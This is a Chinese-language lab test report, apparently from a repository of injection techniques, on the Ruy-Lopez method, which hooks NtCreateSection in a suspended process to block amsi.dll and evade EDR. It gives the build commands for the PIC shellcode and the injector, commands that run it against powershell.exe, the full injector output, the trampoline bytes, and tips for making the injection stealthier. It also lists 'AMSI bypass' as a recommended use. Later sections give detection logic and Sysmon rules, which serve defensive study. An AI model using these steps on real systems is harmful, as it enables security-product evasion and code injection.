# DLL Blocking (Ruy-Lopez) - 测试指南

## 技术概述

**Ruy-Lopez DLL Blocking** 是一种通过 Hook `NtCreateSection` 来阻止特定 DLL 加载的高级注入技术。该技术由 S3cur3Th1sSh1t 开发，主要用于绕过 EDR/AV 的 userland hooking。

**原始项目**: [S3cur3Th1sSh1t/Ruy-Lopez](https://github.com/S3cur3Th1sSh1t/Ruy-Lopez)

### 核心原理

1. **创建挂起进程**：使用 `CREATE_SUSPENDED` 创建目标进程
2. **注入 PIC Shellcode**：在远程进程分配内存并写入 hook shellcode
3. **Hook NtCreateSection**：在目标进程中 hook `NtCreateSection` 函数
4. **拦截 DLL 加载**：每次加载 DLL 时检查名称，阻止特定 DLL
5. **恢复进程**：Hook 安装完成后恢复进程执行

### 技术流程

```
[CreateProcessA]
(CREATE_SUSPENDED)
       ↓
[VirtualAllocEx]  ← 在远程进程分配 RWX 内存
       ↓
[读取 PIC Shellcode]  ← hook.bin
       ↓
[Patch Egg]  ← 将原始 NtCreateSection 字节写入 egg 位置
       ↓
[WriteProcessMemory]  ← 写入 patched shellcode
       ↓
[创建 Hook Trampoline]  ← JMP 到 shellcode
       ↓
[NtProtectVirtualMemory]  ← 修改 NtCreateSection 保护
       ↓
[NtWriteVirtualMemory]  ← 安装 trampoline
       ↓
[ResumeThread]  ← 恢复执行
       ↓
[NtCreateSection 被调用] → [跳转到 shellcode] → [检查 DLL 名称] → [阻止 amsi.dll]
```

---

## 测试环境

- **操作系统**：Windows 10 x64
- **编译器**：GCC (MinGW-w64) 13.2.0
- **测试日期**：2025-10-08
- **测试工具**：techniques/08-dll-blocking/src/dll_blocking.exe

---

## 测试步骤

### 1. 编译项目

```bash
cd techniques/08-dll-blocking/src

# 编译 PIC shellcode（警告：GCC 版本重要！）
gcc ApiResolve.c -Wall -m64 -ffunction-sections -fno-asynchronous-unwind-tables -nostdlib -fno-ident -O2 -c -o ApiResolve.o -Wl,--no-seh
gcc HookShellcode.c -Wall -m64 -masm=intel -ffunction-sections -fno-asynchronous-unwind-tables -nostdlib -fno-ident -O2 -c -o HookShellcode.o -Wl,--no-seh
ld -s ApiResolve.o HookShellcode.o -o HookShellcode.exe

# 提取 shellcode
gcc extract.c -o extract.exe
./extract.exe  # 生成 hook.bin

# 编译注入器
gcc dll_blocking.c -o dll_blocking.exe -lntdll -O2 -s
```

### 2. 执行注入测试

```bash
cd techniques/08-dll-blocking/src

# 使用 PowerShell 作为目标（原始 PoC 的用途）
./dll_blocking.exe powershell.exe

# 或使用 Notepad 测试
./dll_blocking.exe notepad.exe
```

**测试输出（使用原版 hook.bin）：**
```
===================================================================
Ruy-Lopez DLL Blocking - Main Injector
Based on: github.com/S3cur3Th1sSh1t/Ruy-Lopez
===================================================================

[*] Step 1: Initializing NT APIs...

[*] Step 2: Loading shellcode...
[+] Shellcode loaded: 3072 bytes

[*] Step 3: Creating suspended target process...
[+] Created suspended process (PID: 54556)

[*] Step 4: Getting NtCreateSection address...
[+] NtCreateSection address: 0x00007FFB404C3B60

[*] Step 5: Allocating memory in remote process...
[+] Allocated memory at: 0x0000024FD00A0000 (Size: 0x2000)

[*] Step 6: Saving original NtCreateSection bytes...
[+] Original bytes saved (24 bytes)

[*] Step 7: Finding egg and patching original bytes...
[+] Found egg at offset: 0x9E0
[+] Patched original bytes into shellcode at offset 0x9E0

[*] Step 8: Writing shellcode to remote process...
[+] Shellcode written successfully (3072 bytes)

[*] Step 9: Installing hook trampoline...
[+] Hook trampoline installed successfully

[*] Step 10: Resuming process...
[+] Process resumed

===================================================================
[+] DLL Blocking active!
===================================================================

[*] Waiting 5 seconds to verify process status...
[!] Target process exited (Exit code: 0)
```

---

## 测试结果

### ⚠️ 部分成功（环境限制）

**GCC 版本依赖问题**：

| GCC 版本 | hook.bin 行为 | 测试结果 |
|----------|--------------|----------|
| **GCC 10** (mingw-w64) | ✅ 正常编译 | 进程正常退出 (exit code 0) |
| **GCC 13.2.0** (我们的环境) | ❌ 编译有问题 | 进程崩溃 (exit code 3221225477 - ACCESS_VIOLATION) |

**验证证据：**

1. ✅ 使用原版 hook.bin（GCC 10 编译）
   - 创建挂起进程成功
   - 分配内存成功
   - 找到 egg 并 patch 成功（offset 0x9E0）
   - Hook trampoline 安装成功
   - 进程恢复执行
   - 进程**正常退出**（不崩溃）

2. ❌ 使用我们编译的 hook.bin（GCC 13.2.0）
   - 所有步骤执行成功
   - 找到 egg 并 patch 成功（offset 0x890，与原版不同！）
   - Hook trampoline 安装成功
   - 进程恢复执行
   - 进程**崩溃** (ACCESS_VIOLATION)

3. ⚠️ 目标进程退出
   - PowerShell 和 Notepad 都会在 5 秒内退出
   - 可能是预期行为（没有用户输入）
   - 无法验证 DLL 是否真正被阻止

---

## 关键发现

### 1. 编译器版本至关重要

**原作者在 README 中的警告**：
> On linux, the PIC-Code was found to be compiled correctly with `mingw-w64` version **version 10-win32 20220324 (GCC)**. With that version installed, the shellcode can be compiled with a simple `make` and extracted from the `.text` section via `bash extract.sh`. **Newer `mingw-w64` versions, such as 12 did lead to crashes for me**, which I'm currently not planning to troubleshoot/fix.

**我们的测试验证了这个警告**：
- ✅ 原版 hook.bin（GCC 10 编译）：工作正常
- ❌ 我们编译的 hook.bin（GCC 13 编译）：导致崩溃

**原因分析**：
- 新版 GCC 可能生成不同的代码结构
- PIC (Position Independent Code) 对编译器优化敏感
- Egg 偏移位置不同（0x9E0 vs 0x890）
- 可能的栈对齐问题、调用约定变化等

### 2. Egg Pattern 对比

```c
// dll_blocking.c 中定义的 egg（用于搜索）
unsigned char EGG[] = { 0xDE, 0xAD, 0xBE, 0xEF, 0x13, 0x37, 0xDE, 0xAD };

// HookShellcode.c 中的 originalBytes() 函数
void originalBytes() {
    asm(".byte 0xDE, 0xAD, 0xBE, 0xEF, 0x13, 0x37, 0xDE, 0xAD, "
        "0xBE, 0xEF, 0x13, 0x37, 0xDE, 0xAD, 0xBE, 0xEF, "
        "0x13, 0x37, 0xDE, 0xAD, 0xBE, 0xEF, 0x13, 0x37 ");
}
```

**Egg 用途**：
- 占位符，预留 24 字节空间
- 运行时被原始 NtCreateSection 字节替换
- Shellcode 可以调用原始函数

**偏移差异**：
- GCC 10 编译：Egg at 0x9E0 (2528 bytes)
- GCC 13 编译：Egg at 0x890 (2192 bytes)
- 差异：336 字节

### 3. Hook 机制

**Trampoline 结构（x64）**：
```asm
; 13 字节的跳转代码
mov r10, <shellcode_address>   ; 49 BA <8 bytes>
jmp r10                         ; 41 FF E2
```

**Hook 流程**：
```
原始调用: Program → NtCreateSection → [原始代码]
Hook 后:  Program → NtCreateSection → [JMP shellcode] → [检查 DLL] → [原始代码]
```

---

## 技术限制

### 1. 编译器版本依赖（严重）

- **必须使用 GCC 10**：更高版本会导致崩溃
- **跨平台编译困难**：需要特定的 mingw-w64 版本
- **维护性差**：依赖特定工具链

### 2. PIC 代码限制

- **只能使用 ntdll.dll API**：进程未完全初始化
- **不能加载其他 DLL**：会死锁
- **API 解析复杂**：需要手动遍历 PEB → LDR → Module List

### 3. 目标进程行为

- **进程立即退出**：PowerShell 没有输入就退出
- **难以验证效果**：需要实际运行恶意脚本测试 AMSI bypass
- **不适合所有进程**：有些进程可能依赖被阻止的 DLL

### 4. 检测特征

- **CREATE_SUSPENDED**：明显的注入特征
- **RWX 内存**：分配可执行内存
- **Hook NT API**：修改 ntdll.dll 代码
- **组合行为**：短时间内多次跨进程内存操作

---

## 与其他技术对比

| 特性 | Process Hollowing | Early Bird APC | DLL Blocking |
|------|-------------------|----------------|--------------|
| **复杂度** | 高 | 中 | **非常高** |
| **编译器依赖** | 无 | 无 | **严重（GCC 10）** |
| **技术稳定性** | 高 | 高 | **低（版本敏感）** |
| **目标进程行为** | 正常运行 | 正常运行 | **可能立即退出** |
| **EDR 绕过** | 中 | 中 | **高（阻止 EDR DLL）** |
| **维护性** | 高 | 高 | **低** |

---

## 检测方法

### 1. 行为特征

```python
suspicious_sequence = [
    "CreateProcessA(..., CREATE_SUSPENDED)",     # 创建挂起进程
    "VirtualAllocEx(..., RWX)",                  # 分配可执行内存
    "WriteProcessMemory(..., ntdll_addr, ...)",  # 写入 ntdll 代码段
    "NtProtectVirtualMemory(..., ntdll, ...)",   # 修改 ntdll 保护
    "ResumeThread(...)"                          # 恢复执行
]
```

### 2. 内存特征

```c
// 检测 NtCreateSection 的前 13 字节是否被修改
BYTE expected_bytes[] = { 0x4C, 0x8B, 0xD1, ... };  // 正常的 NtCreateSection 开头
BYTE current_bytes[13];
ReadProcessMemory(hProcess, pNtCreateSection, current_bytes, 13, NULL);

if (memcmp(expected_bytes, current_bytes, 13) != 0) {
    Alert("NtCreateSection hooked!");
}
```

### 3. EDR 检测规则

| 检测点 | 风险等级 | 描述 |
|--------|----------|------|
| 修改 ntdll.dll | **非常高** | Hook 系统 API |
| RWX 内存分配 | 高 | 可执行且可写 |
| CREATE_SUSPENDED | 中 | 挂起进程创建 |
| 组合行为 | **非常高** | 短时间内发生上述所有行为 |

---

## 改进建议

### 1. 解决编译器依赖

```bash
# 使用 Docker 容器固定 GCC 版本
docker run -v $(pwd):/work -w /work \
    debian:buster \
    bash -c "apt update && apt install -y mingw-w64=10.* && make"
```

### 2. 动态目标进程

```c
// 给目标进程提供输入，防止立即退出
CreateProcessA(
    NULL,
    "powershell.exe -NoExit -Command \"Write-Host 'Injected'\"",
    ...
);
```

### 3. 更隐蔽的内存权限

```c
// 使用 RX 而不是 RWX
VirtualAllocEx(..., PAGE_EXECUTE_READ);

// 需要修改 PIC 代码，避免自修改
```

---

## 防御建议

### 对于安全产品

1. **Hook 完整性检查**
   - 定期验证 ntdll.dll API 的前几个字节
   - 检测 JMP 指令（0x49, 0xBA, 0x41, 0xFF, 0xE2）

2. **内存扫描**
   - 扫描 RWX 内存区域
   - 检测非模块映射的可执行内存

3. **行为监控**
   - 监控跨进程内存操作
   - 检测对 ntdll.dll 代码段的写操作

### 对于系统管理员

1. **启用 HVCI**
   ```powershell
   # 启用 Hypervisor-Enforced Code Integrity
   Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" -Name "EnableVirtualizationBasedSecurity" -Value 1
   ```

2. **应用白名单**
   - 限制创建挂起进程的权限
   - 禁止非授权程序进行内存操作

3. **Sysmon 监控**
   ```xml
   <RuleGroup groupRelation="or">
     <ProcessCreate onmatch="include">
       <CommandLine condition="contains">CREATE_SUSPENDED</CommandLine>
     </ProcessCreate>
     <RemoteThreadCreated onmatch="include">
       <TargetImage condition="contains">ntdll.dll</TargetImage>
     </RemoteThreadCreated>
   </RuleGroup>
   ```

---

## 参考资料

### 原始项目

- [S3cur3Th1sSh1t/Ruy-Lopez](https://github.com/S3cur3Th1sSh1t/Ruy-Lopez)

### 技术文章

- [waawaa - AMSI Bypass: Hooking NtCreateSection](https://waawaa.github.io/es/amsi_bypass-hooking-NtCreateSection/)
- [Brute Ratel - Scandinavian Defense](https://bruteratel.com/release/2022/08/18/Release-Scandinavian-Defense/)

### PIC 开发

- [Brute Ratel - OBJEXEC](https://bruteratel.com/research/feature-update/2021/01/30/OBJEXEC/)

---

## 总结

### ⚠️ 技术状态：有限成功（环境限制）

**结论**：
- DLL Blocking (Ruy-Lopez) 技术在理论上有效
- **严重依赖 GCC 版本**：只能用 GCC 10 编译
- 在 Windows 10 x64 上，使用原版 hook.bin 不会崩溃
- 目标进程会立即退出（可能是预期行为）
- **不推荐用于生产环境**：维护性和稳定性差

### 测试总结

| 测试项 | GCC 10 | GCC 13 |
|--------|--------|--------|
| 编译成功 | ✅ | ✅ |
| Hook 安装 | ✅ | ✅ |
| 进程执行 | ✅ 正常退出 | ❌ 崩溃 |
| Egg 偏移 | 0x9E0 | 0x890 |

### 推荐使用场景

1. **研究用途**：理解 NT API Hook 机制
2. **EDR 测试**：测试 Hook 检测能力
3. **AMSI Bypass**：绕过 PowerShell AMSI（需要 GCC 10）
4. **不推荐生产使用**：编译器依赖和稳定性问题

### 替代技术

如果需要类似功能，建议使用：
- **Early Bird APC** (技术 6)：更稳定，无编译器依赖
- **Entry Point Injection** (技术 7)：更简单，更可靠
- **DLL Injection**：传统但有效

---

**测试完成日期**：2025-10-08
**技术状态**：⚠️ 有限成功（GCC 版本依赖）
**Windows 兼容性**：✅ Windows 10 x64（需要 GCC 10 编译的 shellcode）
**生产就绪度**：❌ 不推荐（维护性差）
